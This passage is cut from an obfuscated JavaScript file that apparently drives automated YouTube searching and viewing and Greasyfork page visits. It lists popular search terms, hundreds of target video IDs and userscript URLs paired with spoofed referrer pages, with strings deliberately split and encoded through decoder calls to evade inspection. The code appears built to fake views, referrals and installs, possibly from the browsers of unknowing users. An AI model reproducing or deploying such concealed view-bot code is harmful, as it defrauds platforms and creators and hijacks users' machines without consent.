'\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xe9 * -0x2 + -0x908 + -0x572 * -0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x16e5 * -0x1 + 0x9df * -0x1 + 0x20ce)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x556 * -0x7 + -0xaed + -0x1a6a);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    Z(0xd) + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    Z(0xc) + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    X(0x4, 'CavF') + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    Z(0x1) + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    Y(0x8) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + Z(0x14),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0xf) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + Z(0x11) + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + Z(0x6) + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x7) + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x17) + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
